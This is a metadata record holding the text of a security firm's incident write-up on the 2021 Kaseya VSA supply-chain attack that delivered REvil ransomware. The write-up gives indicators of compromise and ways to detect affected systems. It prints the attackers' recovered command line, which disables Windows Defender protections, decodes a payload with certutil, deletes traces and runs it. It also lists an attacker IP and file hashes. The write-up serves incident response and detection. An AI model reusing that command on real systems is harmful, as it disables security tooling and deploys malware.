{
    "id": "0199e2c9-7842-45f5-b796-ab25c3bf9055",
    "created_at": "2023-01-12T15:06:48.176807Z",
    "updated_at": "2025-03-27T02:05:42.098877Z",
    "deleted_at": null,
    "sha1_hash": "44a5d4313344a2e4fa9f4c50af6c42af0670b85b",
    "title": "2021-07-04 - Kaseya supply chain attack targeting MSPs to deliver REvil ransomware",
    "authors": "",
    "file_creation_date": "2022-05-29T01:11:52Z",
    "file_modification_date": "2022-05-29T01:11:52Z",
    "file_size": 4536418,
    "plain_text": "# Kaseya Supply Chain Attack Targeting MSPs to Deliver REvil Ransomware\n\n**[blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/](https://blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/)**\n\n**EDIT 2021-07-04 17:40 CET: Added redacted screenshots of exploit traffic**\n\n**EDIT 2021-07-04 23.10 CET: Added additional details and attack overview**\n\n**EDIT 2021-07-05 19.40 CET: Added methods to identify compromised systems**\n\n**EDIT 2021-07-06 17.14 CET: Added link to script to identify infected systems**\n\n**EDIT 2021-07-08 14.45 CET:** **Further clarified the identified steps of the exploit**\n\nWe have been investigating this issue and our CSIRT team has been working around the\nclock to help affected organizations.\n\nWe are thankful for all information that other security researchers and response teams have\n[been sharing, such as Huntress and](https://www.huntress.com/blog/rapid-response-kaseya-vsa-mass-msp-ransomware-incident) [Kevin Beaumont. So far, we don’t see any substantial](https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b)\ndiscrepancy between the results of our investigation and the publicly available IOCs that\nhave been shared.\n\n## Attack Overview\n\n\n-----\n\nKaseya customers using the on-prem VSA server were affected by this attack. The VSA\nserver is used to manage large fleets of computers and is normally used by MSPs to\nmanage all their clients. Without separation between client environments, this creates a\ndependency: if the VSA server is compromised, all client environments managed from this\nserver can be compromised too.\n\nAdditionally, if the VSA server is exposed to the internet, any potential vulnerability could be\nleveraged over the Internet to breach the server. This is what happened in this case. The\nthreat actor, an affiliate of the REvil ransomware-as-a-service, identified and exploited a\nzero-day vulnerability in the VSA server.\n\nThe vulnerability was exploited to introduce a malicious script to be sent to all computers\nmanaged by the server, therefore reaching all the end clients. The script delivered the REvil\nransomware and encrypted the systems.\n\n_Overview of the attack_\n\n## VSA Server Zero-Day\n\nWe have identified the exploit code used by the threat actor to compromise the Internetfacing VSA servers. Since a patch has been available since July 11, and after we have\nvalidated the patch and verified that the attack vector is no longer present, we published the\n**details of the exploit in a follow-up technical post.**\n\nThank you Visma for extracting traffic data from your DarkTrace appliances and providing it\nto us for investigation.\n\n\n-----\n\n**Truesec has confirmed the complete exploit chain and produced a working proof-of-**\n**concept exploit. The following vulnerabilities were chained in the exploit:**\n\n**Authentication Bypass**\n**Arbitrary File Upload**\n**Request Forgery Token Bypass**\n**Local File Code Injection**\n\n_Attack Kill Chain_\n\nWe want to share an IP address that we have identified, used to launch the exploit:\n```\n161[.]35.239.148\nUser-Agent: curl/7.69.1\n\n```\nOrganizations and response teams can use this to identify if exploitation was launched\nagainst the VSA servers. Note that as part of the exploitation, the IIS logs are cleared,\ntherefore a lack of indications in the IIS logs does not necessarily mean that the system was\nnot exploited.\n\nAt this time, we do not know if the threat actor changed the source IP address for each\nexploited VSA server, however, we expect a large overlap.\n\n\n-----\n\n_Part of Exploit Against VSA Server_\n\n## Malicious Procedure to Clients\n\nThe code executed on the VSA server as part of the exploit triggered execution of a\nmalicious procedure on computers managed by the server. This effectively reaches all\nmanaged clients.\n\nAs the first stage deletes logs in multiple locations (IIS logs as well as logs stored in the\napplication database), not all the steps have been reconstructed yet. However, the procedure\npushed to the clients was recovered and is reported below.\n```\nexecFile(): Path=\"C:\\windows\\system32\\cmd.exe\", arg=\"/c ping 127.0.0.1 -n 7615 > nul\n& C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true DisableIOAVProtection $true -DisableScriptScanning $true EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force MAPSReporting Disabled -SubmitSamplesConsent NeverSend & copy /Y\nC:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe & echo %RANDOM% >>\nC:\\Windows\\cert.exe & C:\\Windows\\cert.exe -decode c:\\kworking1\\agent.crt\nc:\\kworking1\\agent.exe & del /q /f c:\\kworking1\\agent.crt C:\\Windows\\cert.exe &\nc:\\kworking1\\agent.exe\", flag=0x00000002, timeout=0 seconds\n\n```\nThis disables some features of Windows Defender, uses certutil to decode the previously\nuploaded agent.crt to agent.exe, and executes it.\n\n\n-----\n\nWhen executed, agent.exe will drop two additional files: MsMpEng.exe (a legitimate version\nof the Windows Defender binary) and mpsvc.dll (REvil ransomware). The execution of\nMsMpEng.exe triggers the loading of mpsvc.dll (side-loading execution) and therefore\nexecutes the REvil ransomware in the context of MsMpEng.exe.\n\n## Methods to Identify Compromised Systems – Kaseya VSA\n\nTruesec has identified several methods to detect if systems are affected. This is possible\nboth for a device with a Kaseya agent installed, but also on a central Kaseya VSA server.\n\nSeveral logs such as the web server and database logs are cleared or deleted on the\nKaseya VSA servers we have investigated. However, we were able to discover at least one\nlog file that contained valuable data.\n\nIn our case, this log file was located at D:\\Kaseya\\Kserver\\Kserver.log”. When inspecting the\ncontent of the file, we were able to find traces of the “agent.crt” file being sent out to systems.\n\nThe log for a specific system looks as follows:\n```\n[I 2021-07-02T13:59:59.544250Z +02:00 ] [ProcessCmd] Systemname-and-Kaseya-agentdetails (REDACTED) logged in successfully.\n [I 2021-07-02T14:00:01.512990Z +02:00 1840 16cc] [EVENT_SERVER] Fri Jul 2 16:00:01\n2021: [5836] WARNING: Write File task will rewrite entire file\n'#agentWrkDir#\\agent.crt' to 'Systemname-and-Kaseya-agent-details' (REDACTED) because\nthe timestamp of the file on the server has changed.\n [I 2021-07-02T14:00:01.559863Z +02:00 1840 12b4] [EVENT_SERVER] Fri Jul 2 16:00:01\n2021: [4788] Write File task continuing previous transfer to file\n'#agentWrkDir#\\agent.crt' at offset 1221800 of 1221802 bytes for 'Systemname-andKaseya-agent-details' (REDACTED). Process time = 0 seconds.\n\n```\nThese log entries indicate that an attempt was made to send out the file “agent.crt” to the\nworking directory (default C:\\kworking) of the target machine. As such, it is possible from the\ncentral Kaseya VSA servers to identify which systems were targeted.\n\nWe have also confirmed that it is possible that systems are part of the list, and that an\nattempt at encrypting them was made, but was unsuccessful.\n\n## Methods to Identify Compromised Systems – Systems With Agent\n\nOn a device that has a Kaseya agent installed, many different indicators exist. This list\ncontains several methods which have been relevant in the cases we investigated so far.\n\n**ENCRYPTION**\n\nThe registry key HKLM:\\SOFTWARE\\Wow6432Node\\BlackLivesMatter which contains\ninformation related to the ransomware\n\n\n-----\n\nThe ransomware readme file and files with the same file ending as the -readme.txt\nnoted prefix\n\n**ATTEMPTS TO EXECUTE MALICIOUS CODE**\n\nIt is possible that there was an attempt at executing the malicious code, but where the\nexecution was unsuccessful. In such cases the following identification methods are valuable:\n\nC:\\Windows\\System32\\winevt\\Logs\\Windows Powershell.evtx – Check for the\nmalicious powershell execution “Set-MpPreference -Set-MpPreference DisableRealtimeMonitoring ….”\nAny of the files noted in the IoC list. The “C:\\kworking” directory is based on the\nworking directory for the Kaseya agent, which is defined in the registry key\nHKLM:\\SOFTWARE\\Wow6432Node\\Kaseya\\Agent. Multiple agents can be installed,\nand therefore multiple versions of the files.\nSigns of the malicious execution in the Kasey AgentMon log located at: C:\\Program\nFiles (x86)\\Kaseya\\\\AgentMon.log”\nRunning process agent.exe\nRunning process MsMpEng.exe with loaded mpsvc.dll\n\n**We have also** **[released a script to help victims and responders of the Kaseya](https://github.com/Truesec/Kaseya-CheckandMitigate)**\n**ransomware attack to identify and mitigate affected systems. This is for the end**\nsystems, not the VSA servers.\n\n## IOCs\n```\n161[.]35.239.148\nmpsvc.dll 8DD620D9AEB35960BB766458C8890EDE987C33D239CF730F93FE49D90AE759DD\nagent.exe D55F983C994CAA160EC63A59F6B4250FE67FB3E8C43A388AEC60A4A6978E9F1E\nagent.crt 45AEBD60E3C4ED8D3285907F5BF6C71B3B60A9BCB7C34E246C20410CF678FC0C\n\n YouTube Video\n\n```\nWe held a live webinar for approximately 35 minutes to answer many of the questions we\nhave received.\nDue to the nature of the exploit, and the fact that it is zero-day, we are not disclosing any\nspecific details of the exploit. We have shared the details directly with Kaseya.\nEDIT: since a patch has been available since July 11, and after we have validated the patch\nand verified that the attack vector is no longer present, we published the details of the\n**exploit in a follow-up technical post.**\n\n\n-----\n\nWatch Video At:\n\n\nhttps://youtu.be/kKcko4LdeSM\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "4e039bf8-7239-4999-8ec0-eb202d1465af",
            "created_at": "2022-12-04T11:19:36.52593Z",
            "updated_at": "2022-12-04T11:19:36.52593Z",
            "deleted_at": null,
            "name": "ORKL",
            "url": "https://github.com/ORKL/library",
            "description": "ORKL Community Contributed Content",
            "reports": null
        },
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-04 - Kaseya supply chain attack targeting MSPs to deliver REvil ransomware.pdf"
    ],
    "report_names": [
        "2021-07-04 - Kaseya supply chain attack targeting MSPs to deliver REvil ransomware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536008,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1653786712,
    "ts_modification_date": 1653786712,
    "files": {
        "pdf": "https://archive.orkl.eu/44a5d4313344a2e4fa9f4c50af6c42af0670b85b.pdf",
        "text": "https://archive.orkl.eu/44a5d4313344a2e4fa9f4c50af6c42af0670b85b.txt",
        "img": "https://archive.orkl.eu/44a5d4313344a2e4fa9f4c50af6c42af0670b85b.jpg"
    }
}